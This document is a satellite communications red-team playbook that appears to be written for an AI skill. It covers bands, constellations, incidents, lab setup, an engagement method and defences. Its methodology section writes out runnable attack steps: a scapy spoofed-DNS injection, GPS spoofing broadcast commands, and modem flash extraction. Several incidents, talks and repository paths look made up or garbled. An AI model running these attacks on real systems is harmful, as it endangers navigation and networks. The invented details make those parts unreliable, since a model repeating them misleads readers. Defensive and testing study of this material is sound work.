# Satellite & LEO Communication Security Playbook

> End-to-end satellite red team playbook for the `satellite-leo-security` skill.
>
> Covers frequency band taxonomy, constellation comparison, real-world incidents (Viasat KA-SAT AcidRain Feb 2022, Starlink SpaceX cyber-attacks claim 2022, Iridium pager SNMS, HughesNet DSL modem CSRF 2017, Apache Chukwa fleet monitoring breach), lab setup, and defensive guidance.
>
> **Scope rule**: TX-side work (VSAT uplink, GPS spoofing broadcast, Iridium/Inmarsat uplink) is restricted to authorized lab / Faraday / open-field test range. The default posture is RX-only.

---

## Table of Contents

1. [Frequency Band Taxonomy](#1-frequency-band-taxonomy)
2. [Constellation Comparison](#2-constellation-comparison)
3. [Real-World Incidents](#3-real-world-incidents)
4. [Lab Setup](#4-lab-setup)
5. [Engagement Methodology](#5-engagement-methodology)
6. [Defensive Guidance](#6-defensive-guidance)
7. [Legal & Ethical Considerations](#7-legal--ethical-considerations)
8. [References](#8-references)

---

## 1. Frequency Band Taxonomy

Satellite communications span roughly 1.5 GHz to 50 GHz, divided into bands with distinct propagation characteristics, regulatory regimes, and attack surfaces.

### 1.1 Band Summary

| Band | Downlink (GHz) | Uplink (GHz) | Use | Notes |
|------|------|------|------|------|
| **L** | 1.5–1.6 | 1.6–1.7 | Inmarsat, Iridium (mobile), GPS L1 | Penetrates foliage, light building walls |
| **S** | 1.9–2.5 | 2.1–2.7 | Globalstar, DVB-SH, Sirius XM | Limited penetration; mobile |
| **C** | 3.4–4.2 | 5.9–6.4 | Asia satellite TV, some VSAT | Resistant to rain fade |
| **X** | 7.2–7.9 | 7.9–8.4 | Military / government | Restricted allocation |
| **Ku** | 10.7–12.75 | 14.0–14.5 | DVB-S/S2, VSAT, Starlink user link | Standard for TV and VSAT |
| **Ka** | 17.7–21.2 | 27.0–31.0 | Viasat, Hughes Jupiter, Starlink gateway | High throughput; rain fade |
| **V** | 37.5–42.5 | 47.2–50.2 | Future HTS, inter-sat links | Atmospheric attenuation high |
| **GNSS** | 1.2, 1.5, 1.6 | N/A | GPS, Galileo, GLONASS, BeiDou | Receive-only; one-way |

### 1.2 L-Band (1.5–1.7 GHz)

L-band is the workhorse for mobile satellite services (Inmarsat, Iridium) and GNSS. Its propagation characteristics — penetration of light foliage and building walls — make it ideal for handheld terminals. The bandwidth is limited (typically 34 MHz allocations), so L-band services are low-rate (2.4–700 kbps).

```text
Inmarsat downlink: 1525–1559 MHz (34 MHz)
Inmarsat uplink:   1626.5–1660.5 MHz (34 MHz)
Iridium downlink:  1616–1626.5 MHz (10.5 MHz)
Iridium uplink:    1616–1626.5 MHz (same — TDD)
GPS L1:            1575.42 MHz (1.023 Mcps spread)
GPS L2:            1227.60 MHz
GPS L5:            1176.45 MHz
Galileo E1:        1575.42 MHz
Galileo E5:        1176.45, 1207.14, 1278.75 MHz
GLONASS L1:        1598.0625–1609.3125 MHz (FDMA, 15 channels)
BeiDou B1:         1561.098 MHz
```

### 1.3 Ku-Band (10.7–12.75 GHz down, 14.0–14.5 GHz up)

Ku-band is the workhorse for Fixed Satellite Service (FSS) — DVB-S/S2 broadcast TV, VSAT enterprise networks, and Starlink's user link. The bandwidth is wide (500 MHz to 2 GHz per beam), enabling multi-Gbps throughput per transponder. Rain fade is moderate; terminals require a clear line of sight to the satellite.

```text
FSS downlink: 10.7–11.7 GHz (low band, 9750 MHz LO)
FSS downlink: 11.7–12.75 GHz (high band, 10600 MHz LO)
BSS downlink: 12.2–12.7 GHz (Direct Broadcast Satellite — DIRECTV, Dish)
Uplink:       14.0–14.5 GHz (FSS); 17.3–17.8 GHz (BSS)
```

### 1.4 Ka-Band (17.7–21.2 GHz down, 27.0–31.0 GHz up)

Ka-band is the workhorse for High-Throughput Satellites (HTS) — Viasat KA-SAT, Hughes Jupiter, Inmarsat I-6, Starlink gateway. The bandwidth is the widest of any commercial satellite band (2+ GHz per beam), enabling tens of Gbps per satellite. Rain fade is severe; terminals require smaller beams and more aggressive ACM (Adaptive Coding and Modulation).

```text
Downlink: 17.7–21.2 GHz (commercial Ka)
Uplink:   27.0–31.0 GHz (commercial Ka)
Viasat KA-SAT Europe: 19.7–20.2 GHz down, 29.5–30.0 GHz up
Starlink gateway link: 18.3–19.3 GHz down, 28.1–29.1 GHz up
```

### 1.5 GNSS Bands

GNSS signals are one-way (satellite to receiver only); the receiver cannot transmit back. This means GNSS attacks are inherently receiver-side — the attacker broadcasts a counterfeit signal that overrides the authentic one.

```text
GPS L1 C/A:   1575.42 MHz, BPSK, civil, public
GPS L1C:      1575.42 MHz, MBOC, civil, modernized
GPS L2C:      1227.60 MHz, BPSK, civil
GPS L5:       1176.45 MHz, BPSK, civil, safety-of-life
GPS M-code:   1575.42 MHz, encrypted, military
Galileo E1:   1575.42 MHz, CBOC
Galileo E5:   1176.45 (E5a), 1207.14 (E5b), 1278.75 (E5 AltBOC)
Galileo E6:   1278.75 MHz, commercial
GLONASS L1:   1598.06–1609.31 MHz, FDMA (15 channels)
GLONASS L2:   1242.94–1251.69 MHz
BeiDou B1:    1561.098 MHz
BeiDou B2:    1207.14 MHz
BeiDou B3:    1268.52 MHz
SBAS (WAAS/EGNOS/MSAS/GAGAN): 1575.42 MHz, GPS-like
```

---

## 2. Constellation Comparison

Satellite constellations differ by orbit (LEO / MEO / GEO), latency, throughput, and coverage.

### 2.1 Orbit Comparison

| Orbit | Altitude | Latency (RTT) | Orbital period | Examples |
|------|------|------|------|------|
| **LEO** | 550–1200 km | 30–60 ms | 90–110 min | Starlink, Iridium, OneWeb, Globalstar |
| **MEO** | 8000–20000 km | 100–150 ms | 6–12 hours | O3b, GPS (20200 km), Galileo (23222 km) |
| **GEO** | 35786 km | 480–600 ms | 24 hours (stationary) | Viasat, Inmarsat, Hughes, Intelsat, SES |

### 2.2 LEO Broadband Constellations

| Constellation | Operator | Altitude | Planes | Satellites (2024) | User band | Throughput |
|------|------|------|------|------|------|------|
| **Starlink** | SpaceX | 550–570 km | 72 | ~5500 (planned 12,000–42,000) | Ku (user), Ka (gateway) | 100–300 Mbps down |
| **OneWeb** | UK/Bharti | 1200 km | 12 | 648 (complete) | Ku (user), Ka (gateway) | Enterprise only |
| **Kuiper** | Amazon | 590–630 km | 34 | Prototype (2024) | Ka | Planned 2025 |
| **Telesat Lightspeed** | Telesat | ~1000 km | — | Planned 198 | Ka | Planned 2027 |

### 2.3 LEO Narrowband Constellations

| Constellation | Operator | Altitude | Satellites | Band | Service |
|------|------|------|------|------|------|
| **Iridium NEXT** | Iridium | 780 km | 66 (active) + 9 (spare) | L | Voice, SBD, Certus broadband |
| **Globalstar** | Globalstar | 1400 km | 24 (active) + 24 (spare) | L/S | Voice, low-rate data, Apple Emergency SOS |
| **Swarm** | SpaceX subsidiary | ~550 km | ~150 | VHF/UHF | IoT (low-rate) |
| **Astrocast** | Astrocast | ~600 km | ~20 (planned 64) | L | IoT |
| **Kineis** | Kineis | ~650 km | 25 (planned) | VHF/UHF | IoT |
| **Lacuna Space** | Lacuna | ~500 km | ~30 (planned) | UHF | IoT (LoRa) |

### 2.4 GEO Broadband Satellites

| Satellite | Operator | Orbital slot | Launched | Throughput | Service |
|------|------|------|------|------|------|
| **KA-SAT** | Viasat (formerly Eutelsat) | 9°E | 2010 | 70 Gbps | Europe residential/enterprise |
| **Viasat-1** | Viasat | 115°W | 2011 | 140 Gbps | North America |
| **Viasat-2** | Viasat | 70°W | 2017 | 260 Gbps | Americas |
| **Viasat-3 Americas** | Viasat | TBD | 2023 (deployed with antenna issue) | 1 Tbps planned | Americas |
| **Jupiter-3** | Hughes | 96°W | 2023 | 500 Gbps | Americas |
| **Inmarsat I-4** | Inmarsat | 64°E / 54°W / 178°E | 2005–2008 | 12 Gbps each | BGAN global |
| **Inmarsat I-6** | Inmarsat | 63°E (F1), -143°E (F2) | 2021–2023 | Larger capacity | BGAN + L-band |

### 2.5 GEO Broadcast Satellites

| Operator | Satellites | Service |
|------|------|------|
| **SES** | ~70 satellites (SES-1 to SES-22, O3b mPower) | DTH TV, enterprise |
| **Eutelsat** | ~35 satellites | DTH TV, enterprise |
| **Intelsat** | ~50 satellites | Enterprise, government |
| **DIRECTV** | Multiple (Lyndon, Galaxy) | US DTH TV |
| **Dish Network** | Multiple (EchoStar) | US DTH TV |

---

## 3. Real-World Incidents

### 3.1 Viasat KA-SAT AcidRain Wiper (Feb 28, 2022)

The most consequential satellite cyber-attack in history. On Feb 28, 2022, four days after the Russian invasion of Ukraine, an attacker (publicly attributed by Western intelligence agencies to Russia) compromised the Viasat KA-SAT management plane and pushed the AcidRain wiper to SurfBeam2 modems across the European footprint.

**Impact**:
- ~5,800 SurfBeam2 modems bricked in Ukraine, Germany, France, Italy, Poland, Hungary, Greece
- Viasat declared the modems "unrecoverable" — they required physical replacement
- The attack disrupted:
  - Ukrainian military communications (which relied on KA-SAT terminals)
  - ~5,800 wind turbines in Germany (Enercon SCADA modems, which used KA-SAT for backhaul)
  - Marlink maritime VSAT customers (which used KA-SAT capacity in some regions)

**Wiper analysis (SentinelLabs, March 2022)**:
- MIPS architecture, built for uClinux on the SurfBeam2's Broadcom SoC
- Strategy: stop processes, unmount filesystems, overwrite `/dev/mtdblock*` with `/dev/urandom` output, reboot
- The boot loader was overwritten along with the kernel, leaving the modem unable to boot
- Purpose-built — not a generic Linux wiper; the attacker knew the target environment

**Attribution**: Western intelligence agencies (US, UK, EU) attributed the attack to Russia. The French ANSSI confirmed the wiper's MIPS target.

**Lessons**:
- The management plane's authentication was the vulnerability — shared fleet-wide credentials allowed a single compromised credential to push the wiper to all terminals
- The firmware update path was not signed (or weakly signed) — the terminals accepted the unsigned wiper as a valid update
- The fleet monitoring plane (Apache Chukwa-class) did not detect the wiper in real time — the first bricked terminals went unnoticed for hours

### 3.2 Starlink SpaceX Cyber-Attack Claims (2022–2023)

SpaceX has publicly confirmed that Starlink has been the target of cyber-attacks, particularly in the context of the Russia-Ukraine war where Starlink terminals are used by Ukrainian forces. Specific claims include:

- **Russian jamming** of Starlink downlinks in occupied Ukraine (confirmed; SpaceX responded with software updates to improve jamming resistance)
- **AcidRain-class wiper attempts** against Starlink terminals (publicly discussed by SpaceX executives; the secure boot chain prevented bricking)
- **Lemonduck-class malware** on attached host devices (separate from Starlink itself)

**SpaceX's defensive posture** (publicly discussed):
- Chain-of-trust boot (eFuses → SPL → U-Boot → kernel → rootfs)
- Signed firmware updates
- gRPC management plane with per-terminal credentials
- Beam-level frequency hopping for jamming resistance

### 3.3 Iridium Pager SNMS (Legacy)

Iridium's Special Notification Messaging Service (SNMS) was the paging service for Iridium pagers (9501, 9521). Pages were delivered over the broadcast ring channels and were historically documented as interceptable by anyone with an L-band receiver. The modern pager fleet is small (mostly legacy customers), and the SNMS service is winding down.

### 3.4 HughesNet DSL Modem CSRF (2017)

In 2017, a CSRF vulnerability was documented in the HughesNet HT1100/HT1000 residential modem web UI. An attacker on the LAN could trigger administrative actions (DNS change, password change) via a crafted HTTP request from a victim browser. The vulnerability class is representative of satellite residential modems — web UIs with weak CSRF protection.

### 3.5 Apache Chukwa Fleet Monitoring Breach (2014)

Apache Chukwa (a data-collection system for Hadoop) was used by some operators to aggregate fleet telemetry from satellite terminals. A 2014 vulnerability in Chukwa's HTTP collector allowed unauthenticated log injection — an attacker could inject fabricated terminal telemetry into the fleet monitoring. This incident established that the fleet monitoring plane is itself an attack surface.

### 3.6 C4ADS "Above Us Only Stars" (2019)

C4ADS (a nonprofit analytics firm) published a 2019 report documenting widespread GPS spoofing affecting vessels in the Black Sea, eastern Mediterranean, Persian Gulf, and northern Norway. The spoofing was attributed to state actors (primarily Russia) and was used for various purposes:
- Masking the location of VIPs (e.g., President Putin's movements)
- Disabling drone navigation near sensitive sites
- Forcing vessels into territorial waters

The report demonstrated that GPS spoofing is not a theoretical attack — it is a deployed weapon.

### 3.7 GPS Spoofing of Business Jets (2023–2024)

Multiple reports in 2023–2024 documented widespread GPS spoofing affecting business jets over the eastern Mediterranean, Iraq, and the Black Sea. The spoofing caused aircraft navigation systems to flag anomalies or compute wrong positions. The attacks were attributed to state actors (Russia, Israel) in active conflict zones. The FAA and EASA issued bulletins recommending that pilots cross-check GPS with inertial navigation.

---

## 4. Lab Setup

### 4.1 Hardware

| Item | Purpose | Cost (approx.) |
|------|------|------|
| **HackRF One** | General-purpose SDR, 1 MHz–6 GHz, half-duplex | $330 |
| **BladeRF 2.0 micro xA4** | Higher-end SDR, full-duplex, 47 MHz–6 GHz, 2x2 MIMO | $480 |
| **PlutoSDR (ADALM-PLUTO)** | Compact SDR, 70 MHz–6 GHz, full-duplex | $220 |
| **RTL-SDR V3** | Receive-only, 100 kHz–1.7 GHz (with bias-tee) | $30 |
| **AirSpy R2** | Receive-only, 24 MHz–1.7 GHz, 10 MHz bandwidth | $170 |
| **Ku-band LNB (standard satellite TV)** | Downconverter, 10.7–12.75 GHz → 950–2150 MHz IF | $20 |
| **Ka-band LNB** | Downconverter, 17.7–21.2 GHz → IF | $50–$100 |
| **L-band active antenna (1.6 GHz)** | Iridium / Inmarsat receive | $30 |
| **GPS antenna** | GPS L1 receive | $10 |
| **Bias-tee power inserter** | Powers the LNB from a DC source | $15 |
| **DC blocker** | Protects the SDR from DC | $10 |
| **CH341A SPI programmer** | SurfBeam2 / Dishy SPI flash extraction | $10 |
| **Faraday cage** | GNSS spoofing tests | $200–$2000 |

### 4.2 Software

```bash
# Install on Kali Linux
sudo apt update
sudo apt install -y \
  gnuradio gr-osmosdr gr-iridium \
  hackrf libhackrf-dev \
  rtl-sdr librtlsdr-dev \
  gpredict \
  wireshark tshark \
  multimon-ng \
  dvbsnoop \
  dvb-tools \
  binwalk flashrom \
  grpcurl protobuf-compiler python3-grpc-tools \
  urh

# Install from source
git clone https://github.com/muccy/gr-iridium.git
cd gr-iridium && mkdir build && cd build
cmake .. && make -j4 && sudo make install && sudo ldconfig

git clone https://github.com/pabr/perfect-vines.git
cd perfect-vines && make

git clone https://github.com/osqzsun/GPS-SDR-SIM.git
cd GPS-SDR-SIM && make -j4

pip3 install --user starlink-grpc
```

### 4.3 Lab Configuration

```text
Lab layout:
  - Outdoor antenna (Ku-band dish or L-band patch) on roof
  - Coax run to indoor SDR
  - Bias-tee power inserter inline for LNB
  - SDR connected to a Linux workstation (Kali)
  - gpredict running for pass prediction
  - Spectrum monitor (osmocom_fft) running continuously
  - IQ recorder (rtl_sdr / hackrf_transfer) triggered by gpredict pass predictions

For firmware work:
  - Authorized SurfBeam2 / Dishy / iDirect modem on the bench
  - CH341A SPI programmer connected to the modem's JTAG/serial pads
  - Faraday cage for any TX-side testing (GNSS spoofing, VSAT uplink)
```

### 4.4 Ku-Band Receive Setup

```text
Outdoor:  Standard 60cm offset dish, Ku-band LNB (PLL LO 9750/10600 MHz)
          - Mount dish pointing at a GEO satellite (e.g., Astra 19.2°E in Europe)
          - Or use a phased-array flat-panel antenna for LEO tracking (Starlink)
Indoor:   Bias-tee power inserter to feed 13V/18V DC to the LNB
          - Coax into RTL-SDR V3 (or HackRF) with DC blocker
          - SDR tuned to the downconverted IF (typically 950–2150 MHz)
Software: rtl_power for spectrum survey
          leandvb for DVB-S2 demodulation
          dvbsnoop / tshark for TS analysis
```

### 4.5 L-Band Receive Setup

```text
Outdoor:  Active L-band antenna (1.6 GHz) with integrated LNA
          - Or a quadrifilar helix antenna for Iridium
          - Or a patch antenna for GPS
Indoor:   Bias-tee to feed 3.3V/5V to the active antenna
          - Coax into HackRF One or RTL-SDR V3
Software: hackrf_transfer for capture
          gr-iridium for Iridium demodulation
          gnss-sdr for GPS/Galileo analysis
```

### 4.6 Faraday Cage for GNSS Spoofing

```text
Faraday cage:
  - Conductive enclosure (copper mesh or solid metal)
  - Attenuation: >80 dB across 1–2 GHz
  - Size: large enough for the target GPS receiver + HackRF TX antenna
  - Inside: HackRF with TX antenna, target GPS receiver, control computer
  - Outside: Faraday cage door closed during test
  - Verify attenuation: place a known-good GPS receiver outside the cage; it should track satellites normally while the cage's interior receiver tracks only the spoofed signal
```

---

## 5. Engagement Methodology

### 5.1 Scope Definition

```text
Satellite engagement scope checklist:
  [ ] Operator authorization (Viasat, Starlink, Inmarsat, Iridium, or VSAT operator)
  [ ] Terminal owner authorization (the enterprise that owns the terminals)
  [ ] Frequency authorization (if TX-side work is in scope)
  [ ] Faraday cage / open-field test range authorization (for GNSS spoofing)
  [ ] Written rules of engagement (RoE)
  [ ] Legal review (frequency licensing, conditional access, CA card)
  [ ] Engagement window (off-business-hours for active terminals)
```

### 5.2 Phase 1: Reconnaissance (Passive, RX-Only)

```bash
# Frequency survey
rtl_power -f 950M:2150M:0.5M -i 5s -e 1h ku_band.csv &
rtl_power -f 1500M:1660M:0.1M -i 5s -e 1h l_band.csv &
heatmap.py ku_band.csv ku_band.png
heatmap.py l_band.csv l_band.png

# Constellation tracking
gpredict &
wget -q -O ~/.config/Gpredict/tle/starlink.txt \
  'https://celestrak.org/NORAD/elements/gp.php?GROUP=starlink&FORMAT=tle'

# Terminal discovery (LAN-side)
nmap -sV -p 23,80,443,5775,9200 192.168.0.0/24
```

### 5.3 Phase 2: Signal Capture (RX-Only)

```bash
# L-band capture
hackrf_transfer -r iridium.iq -f 1621250000 -s 2000000 -g 40 -a 1 -d 300
# Ku-band capture
rtl_sdr -f 1127000000 -s 2400000 -g 40 -n 240000000 dvbs2.iq
```

### 5.4 Phase 3: Decode & Demodulate

```bash
# Iridium bursts
gr_iridium -r 2000000 iridium.iq -o iridium_out
# DVB-S2
leandvb --sr 27500000 --in dvbs2.iq --out dvbs2.ts
# TS analysis
dvbsnoop -n 100 dvbs2.ts | head
tshark -r dvbs2.ts -Y 'dvb_mpe' -V
```

### 5.5 Phase 4: Terminal Enumeration

```bash
# Starlink
grpcurl -plaintext -import-path . -proto device.proto 192.168.100.1:9200 list
# Viasat
curl -s http://192.168.0.1/about.cgi
# iDirect
telnet 192.168.1.1
# Hughes
curl -s http://192.168.0.1/cgi/status.cgi
```

### 5.6 Phase 5: Active Test (Authorized Lab Only)

```bash
# VSAT uplink DNS hijack (authorized hub)
python3 -c "
from scapy.all import *
spoofed = Ether()/IP(src='8.8.8.8', dst='10.0.0.10')/UDP(sport=53, dport=33333)/DNS(
    qr=1, ancount=1,
    an=DNSRR(rrname='example.com', type='A', rdata='10.0.0.53', ttl=300)
)
sendp(spoofed, iface='eth0')
"
# GPS spoofing (Faraday cage)
./gps-sdr-sim -e brdc -l 5120.0000,N,00007.2000,W,100 -d 60 -b 16
hackrf_transfer -t gpssim.bin -f 1575420000 -s 2600000 -a 1 -x 20 -R
```

### 5.7 Phase 6: Firmware Analysis (Authorized Lab)

```bash
# SPI flash extraction
sudo flashrom -p ch341a_spi -r surfbeam2_flash.bin
binwalk surfbeam2_flash.bin
binwalk -e surfbeam2_flash.bin
# Document boot chain and signing status
```

### 5.8 Phase 7: Reporting

```text
Report structure:
  1. Executive summary (operator, scope, key findings)
  2. Engagement scope and rules of engagement
  3. Methodology (phases 1–7)
  4. Findings (per-finding: severity, evidence, recommendation)
  5. Defense recommendations (link-layer encryption, secure boot, mTLS, etc.)
  6. References (ETSI specs, MITRE ATT&CK, prior incidents)

Evidence per finding:
  - Frequency / spectrum evidence (IQ captures, spectrograms)
  - Terminal discovery evidence (nmap output)
  - Firmware evidence (hashes, binwalk output)
  - TX-side evidence (Faraday cage authorization, before/during/after positions)
```

---

## 6. Defensive Guidance

### 6.1 Link-Layer Encryption

All IP traffic over the satellite link should be AES-GCM encrypted at the link layer:
- **DVB-RCS2** (ETSI TS 101 545-2) — mandatory for new VSAT deployments
- **GSE-SEC** (Generic Stream Encapsulation Security) — for DVB-S2 IP
- **Vendor-specific** — iDirect linkAES, Hughes LinkEncryption

Never rely on DVB-CSA / DVB-CISSA for IP traffic — those are CA systems for broadcast TV.

### 6.2 Terminal Firmware Signing and Secure Boot

All terminals should require signed firmware images (RSA-2048 / ECDSA P-256) and enforce a chain-of-trust:
- SoC eFuses carry the public key hash
- SPL verifies U-Boot
- U-Boot verifies the kernel
- Kernel verifies the rootfs

The AcidRain wiper succeeded because the SurfBeam2 accepted unsigned firmware updates over its management plane. Modern terminals (Starlink Dishy) enforce secure boot.

### 6.3 Management Plane Authentication

Every terminal's remote management interface must enforce per-terminal mutual-TLS (mTLS) with certificates rotated on a defined cadence (90 days):
- Starlink gRPC — per-terminal credentials
- Viasat TtDotMon — per-terminal mTLS
- iDirect NMS — per-terminal certificates
- Hughes DVB-RCS NMS — per-terminal PSK

Shared fleet-wide credentials are the default in legacy deployments — the Viasat incident showed the consequences.

### 6.4 Hub-Side Uplink Filtering

The hub earth station must filter uplink traffic to reject spoofed DNS, ARP, and DHCP responses from compromised remote terminals:
- Source-IP validation on the uplink
- Per-terminal bandwidth quotas
- Per-terminal protocol filtering (allow only authorized protocols)

Without this, a single compromised VSAT remote can hijack DNS for the entire beam.

### 6.5 GNSS Receiver Hardening

Multi-constellation receivers (GPS + Galileo + GLONASS + BeiDou) with:
- RAIM+ (Receiver Autonomous Integrity Monitoring with fault detection and exclusion)
- Inertial navigation cross-check (INS divergence vs. GPS = strong anomaly)
- CRPA (controlled reception pattern antenna) for spatial filtering
- Power-level monitoring (flag anomalous high-power signals)

Single-constellation L1-only receivers are spoofable with commodity hardware ($330 HackRF + open-source GPS-SDR-SIM).

### 6.6 Beam Hopping Observation

Modern High-Throughput Satellites (Viasat, Hughes Jupiter, Inmarsat) use beam hopping — time-sliced illumination of multiple beams from a single transponder. Beam hopping:
- Makes single-beam jamming less effective (the jammed beam hops away)
- Increases spectral efficiency
- Provides a side channel that defenders can monitor for anomalies

### 6.7 Fleet Monitoring and Integrity

Centralized fleet monitoring is the only practical defense against an AcidRain-class wiper:
- SIEM ingest of terminal boot states, firmware hashes, configuration changes
- Per-terminal integrity attestation (TPM or signed boot log)
- Alert on unexpected firmware changes
- Alert on terminals going offline (early warning of wiper-class attacks)

The first terminals bricked in the Viasat incident were unobserved for hours. A modern fleet monitor would have flagged the simultaneous firmware-change events across thousands of terminals within seconds.

### 6.8 RF-Level Monitoring

For high-value deployments (military, government, critical infrastructure):
- Continuous RF spectrum monitoring at the terminal location
- Anomaly detection on the downlink (unexpected carriers = potential jamming)
- Anomaly detection on the uplink (unexpected emissions = potential unauthorized transmission)
- Cross-correlation with operator-published beam state

### 6.9 Patch Management

Satellite terminal fleets are notoriously slow to patch. Recommended:
- Automated OTA firmware updates (with rollback capability)
- Defined patch cadence (e.g., 30 days from vendor release)
- Fleet-wide patch compliance reporting
- Vendor notification of any patches for CVE-class issues

### 6.10 Incident Response

Pre-stage the incident response plan for an AcidRain-class wiper:
- Pre-positioned spare terminals (the Viasat incident required physical replacement of 5,800 terminals)
- Documented recovery procedure (SPI re-flash via JTAG)
- Communication plan for affected customers
- Coordination with the operator (Viasat, Starlink, Inmarsat)
- Coordination with national CSIRT (CERT) for attribution

---

## 7. Legal & Ethical Considerations

### 7.1 Frequency Licensing

Satellite frequencies are licensed by national regulators (FCC in the US, ETSI/CEPT in Europe). Transmitting without authorization is a criminal offense:
- **US**: 47 USC § 301 (no license), § 333 (willful interference)
- **EU**: RED (Radio Equipment Directive) Art. 9
- **Equivalent** in most jurisdictions

Penalties include fines and imprisonment. The default engagement posture is RX-only.

### 7.2 VSAT Uplink Authorization

VSAT terminals operate under a per-terminal station license tied to:
- Specific frequency (e.g., 14.015 GHz)
- Specific polarization (LHCP / RHCP)
- Specific EIRP (effective isotropic radiated power)
- Specific orbital slot (e.g., 91°W Galaxy-17)

Unauthorized uplink transmission voids the license and is prosecutable.

### 7.3 GPS Spoofing

Even in a lab, broadcasting GPS L1 outside a Faraday cage is dangerous:
- Can disrupt aviation receivers within kilometers
- Can disrupt maritime navigation
- Can disrupt emergency-services timing (GPSDOs)

Lab-only, with proper Faraday cage authorization.

### 7.4 Conditional Access

DVB-CSA descrambling without a CA card from the conditional-access provider is illegal:
- **US**: DMCA § 1201 (anti-circumvention)
- **EU**: Copyright Directive Art. 6

Authorized lab only, with a CA card from the provider.

### 7.5 Terminal Firmware Reverse-Engineering

Reverse-engineering a terminal's firmware may:
- Void the warranty
- Violate the operator's terms of service
- Violate DMCA § 1201 if it circumvents a technological protection measure

Obtain written authorization from the terminal owner before extraction.

### 7.6 Customer Data

Capturing customer traffic (IP, voice, SMS) over the satellite link may constitute unlawful interception:
- **US**: 18 USC § 2511 (Wiretap Act)
- **EU**: Directive 2002/58/EC (ePrivacy)

Customer data captured during an engagement must be handled per the engagement scope and data protection laws.

---

## 8. References

### 8.1 Standards

- **ETSI EN 300 421** — DVB-S (QPSK)
- **ETSI EN 301 790** — DVB-RCS (return channel)
- **ETSI TS 101 545-2** — DVB-RCS2 (with security)
- **ETSI EN 302 307** — DVB-S2
- **ETSI EN 302 307-2** — DVB-S2X
- **ETSI TS 102 606** — GSE (Generic Stream Encapsulation)
- **ETSI TS 100 289** — DVB-CSA (Common Scrambling Algorithm)
- **ETSI TS 102 796** — HBBTV
- **ICD-GPS-200C** — GPS L1 C/A signal spec
- **OS SIS ICD** — Galileo Open Service Signal-in-Space ICD
- **3GPP TS 22.261** — Service requirements for 5G (covers 5G NTN — Non-Terrestrial Networks)

### 8.2 Incident Reports

- **SentinelLabs (March 2022)** — AcidRain analysis (Viasat KA-SAT wiper)
- **C4ADS (2019)** — Above Us Only Stars: Pervasive GNSS Spoofing
- **ANSSI (2022)** — Viasat KA-SAT incident forensics (French national CERT)
- **CISA AA22-056A** — Advisory on AcidRain (Mar 2022)

### 8.3 Research

- **Defcon 27 (2019)** — Lennie Edebor, "Look Up: Ubiquitous GNSS Spoofing"
- **Black Hat USA 2018** — Sergio Pintado, "Hacking Satellites via Inmarsat SDM"
- **USENIX Security 2014** — Marc Lichtman, "GNSS Spoofing via SDR"
- **CCS 2012** — N.O. Tippenhauer et al., "On Requirements for Successful GPS Spoofing Attacks"

### 8.4 Operator Publications

- **SpaceX** — Starlink specifications and engineering updates
- **Viasat** — KA-SAT technical overview
- **Inmarsat** — BGAN technical specifications
- **Iridium** — SBD protocol specification (under NDA)

### 8.5 Government Guidance

- **ENISA** — Threat Landscape for Satellite Communications
- **NIST SP 800-213** — IoT Device Cybersecurity Guidance for Small Businesses (covers satellite IoT)
- **ICAO** — Annex 10, Volume I (Aviation Radio Navigation Aids)
- **IMO** — MSC.428(98) (Maritime Cyber Risk Management)

### 8.6 Industry

- **Satellite Industry Association (SIA)** — State of the Satellite Industry Report
- **Euroconsult** — Satellite Communications & Broadcasting Market Survey
- **GSOA (Global Satellite Operators Association)** — Best Practices

---

## Appendix A: Quick Reference Card

```text
=== SATELLITE BANDS ===
L:  1.5-1.6 GHz   Inmarsat, Iridium, GPS L1
S:  1.9-2.5 GHz   Globalstar, DVB-SH
C:  3.4-4.2 GHz   Asia TV
X:  7.2-7.9 GHz   Military
Ku: 10.7-12.75 GHz DVB-S/S2, VSAT, Starlink user
Ka: 17.7-21.2 GHz Viasat, Hughes, Starlink gateway
V:  37.5-42.5 GHz Future HTS

=== ORBITS ===
LEO: 550-1200 km   30-60 ms RTT
MEO: 8000-20000 km 100-150 ms RTT
GEO: 35786 km      480-600 ms RTT

=== CONSTELLATIONS ===
Starlink:    550-570 km, Ku/Ka, 5500+ sats
Iridium NEXT: 780 km, L, 66 sats (with crosslinks)
OneWeb:      1200 km, Ku/Ka, 648 sats
Kuiper:      590-630 km, Ka, prototype
Viasat KA-SAT: GEO 9°E, Ka, 82 spot beams

=== INCIDENTS ===
AcidRain (Feb 2022): 5800+ KA-SAT modems bricked
C4ADS (2019):         Widespread GPS spoofing of vessels
HughesNet CSRF (2017): Residential modem CSRF

=== TOOLS ===
gpredict:        Pass prediction
gr-iridium:      Iridium L-band demod
leandvb:         DVB-S2 demod
GPS-SDR-SIM:     GPS spoofing signal gen (lab)
grpcurl:         Starlink Dishy API
flashrom + CH341A: SurfBeam2 SPI extraction

=== LEGAL ===
TX on licensed bands: federal offense (US 47 USC §301/§333)
GPS spoofing: lab/Faraday only
DVB-CSA descrambling: requires CA card (DMCA §1201)
```

## Appendix B: MITRE ATT&CK Crosswalk

| Satellite Technique | MITRE ATT&CK |
|------|------|
| VSAT uplink DNS hijack | T1557-Adversary-in-the-Middle |
| AcidRain wiper (Viasat 2022) | T1485-Data Destruction |
| Satellite link jamming | T1499-Endpoint Denial of Service |
| VSAT provisioning abuse | T1098-Account Manipulation |
| Uplink takeover | T1584-Compromise Infrastructure |
| Iridium SBD interception | T1040-Network Sniffing |
| GPS spoofing (maritime) | T1557-Adversary-in-the-Middle |
| Terminal enumeration (gRPC) | T1580-Cloud Infrastructure Discovery (analog) |
| SurfBeam2 firmware extraction | T1213-Data from Information Repositories |
| Starlink beam handover manipulation | T1499-Endpoint Denial of Service |
